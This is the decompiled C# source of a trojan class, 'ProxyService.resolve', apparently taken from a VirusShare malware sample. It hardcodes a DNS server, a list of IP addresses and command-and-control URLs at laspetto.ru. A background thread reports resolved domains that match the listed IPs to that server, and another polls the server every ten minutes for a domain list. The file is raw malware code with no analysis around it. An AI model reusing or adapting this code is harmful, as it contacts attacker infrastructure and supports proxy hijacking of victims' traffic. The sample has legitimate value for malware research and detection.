// Decompiled with JetBrains decompiler
// Type: ProxyService.resolve
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2B8E9BB-A5D7-4D5C-B4AE-5A3C98D271C3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-5d65d7203a5637d6cc5764c9c504b661d11d754618d256d3ba43309573d0cd77.exe

using System;
using System.Collections;
using System.Net;
using System.Threading;

namespace ProxyService
{
  public class resolve
  {
    public const string DNSServer = "46.173.209.194";
    private const int sleepy = 50;
    public static ArrayList iplook = new ArrayList();
    private static int addIndex = 0;
    private static int jobIndex = 0;
    public static ArrayList list = new ArrayList();
    public static Thread thJob;
    public static ArrayList domsCol = new ArrayList();
    public static Thread thDomainsLoader;

    public static void SafeAdd(string rnd)
    {
      try
      {
        bool flag = true;
        for (int index = 0; index <= resolve.list.Count - 1; ++index)
        {
          if (resolve.list[index].ToString() == rnd)
          {
            flag = false;
            break;
          }
        }
        if (!flag)
          return;
        resolve.list.Add((object) rnd);
        ++resolve.addIndex;
      }
      catch (Exception ex)
      {
        ProxyServer.dbg("add_error: " + ex.Message);
      }
    }

    public static void JobStart()
    {
      resolve.thJob = new Thread(new ThreadStart(resolve.JobGo));
      resolve.thJob.Start();
    }

    public static void JobGo()
    {
      while (true)
      {
        try
        {
          while (resolve.jobIndex < resolve.addIndex)
          {
            try
            {
              string hostNameOrAddress = resolve.list[resolve.jobIndex].ToString();
              IPAddress[] ipAddressArray = new IPAddress[0];
              try
              {
                ipAddressArray = Dns.GetHostAddresses(hostNameOrAddress);
              }
              catch (Exception ex)
              {
              }
              foreach (IPAddress ipAddress in ipAddressArray)
              {
                foreach (string str in resolve.iplook)
                {
                  if (str == ipAddress.ToString())
                    vkbill.DownloadURL("http://www.laspetto.ru/adddomain.aspx?domain=" + hostNameOrAddress);
                }
              }
            }
            catch (Exception ex)
            {
            }
            ++resolve.jobIndex;
            Thread.Sleep(50);
          }
        }
        catch (Exception ex)
        {
        }
        Thread.Sleep(50);
      }
    }

    public static void Start()
    {
      resolve.iplook.Add((object) "37.220.26.131");
      resolve.iplook.Add((object) "78.140.138.147");
      resolve.iplook.Add((object) "88.85.93.35");
      resolve.iplook.Add((object) "184.168.221.66");
      resolve.iplook.Add((object) "184.168.174.55");
      resolve.iplook.Add((object) "46.165.197.231");
      resolve.iplook.Add((object) "95.169.187.139");
      resolve.iplook.Add((object) "89.108.74.61");
      resolve.iplook.Add((object) "89.108.72.63");
      resolve.iplook.Add((object) "195.234.99.231");
      resolve.iplook.Add((object) "91.220.101.115");
      resolve.iplook.Add((object) "62.212.72.238");
      resolve.JobStart();
    }

    private static void loadDomainsFromServer()
    {
      resolve.thDomainsLoader = new Thread(new ThreadStart(resolve.loadDoms));
      resolve.thDomainsLoader.Start();
    }

    private static void loadDoms()
    {
      string str1 = "";
      while (!str1.Contains("googlesyndication"))
      {
        str1 = vkbill.DownloadURL("http://laspetto.ru/list.aspx");
        if (str1.Contains("googlesyndication"))
        {
          string[] strArray = str1.Split("<BR>".ToCharArray());
          if (strArray.Length >= 1)
          {
            foreach (string str2 in strArray)
              str2.Trim().ToLower().Contains(".");
          }
          resolve.domsCol.Add((object) "my.com");
          resolve.domsCol.Sort();
          break;
        }
        Thread.Sleep(600000);
      }
    }

    public static bool ReplaceHost(string url) => url.Contains("my.com");
  }
}
